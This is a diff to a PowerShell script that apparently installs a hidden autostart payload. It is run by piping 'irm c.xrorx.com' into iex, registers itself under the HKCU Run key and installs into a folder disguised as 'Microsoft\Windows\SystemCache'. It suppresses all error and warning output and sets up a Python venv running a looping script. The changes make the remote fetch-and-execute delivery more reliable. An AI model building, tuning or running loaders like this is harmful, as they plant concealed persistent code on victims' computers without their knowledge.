@@ -5,21 +5,20 @@
 .DESCRIPTION
     Installs under the current user only (HKCU Run).
     Prints "..." while running, then "[]" when finished.
+    No param() block — required for reliable irm|iex.
 
 .EXAMPLE
     powershell "irm c.xrorx.com|iex"
     irm c.xrorx.com|iex
 #>
 
-param(
-    [string]$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
-)
-
 $ErrorActionPreference = "SilentlyContinue"
 $ProgressPreference = "SilentlyContinue"
 $WarningPreference = "SilentlyContinue"
 $InformationPreference = "SilentlyContinue"
 $VerbosePreference = "SilentlyContinue"
+
+$InstallPath = "$env:LOCALAPPDATA\Microsoft\Windows\SystemCache"
 
 Write-Host "..."
 
@@ -56,7 +55,7 @@ try {
 
     if (-not $pythonPath) {
         Write-Host "[]"
-        exit 1
+        return
     }
 
     $pythonDir = Split-Path $pythonPath
@@ -91,7 +90,7 @@ while True: time.sleep(60)
     }
     if (-not (Test-Path $pyvenvCfg)) {
         Write-Host "[]"
-        exit 1
+        return
     }
 
     $venvPython = Join-Path $venvPath "Scripts\python.exe"
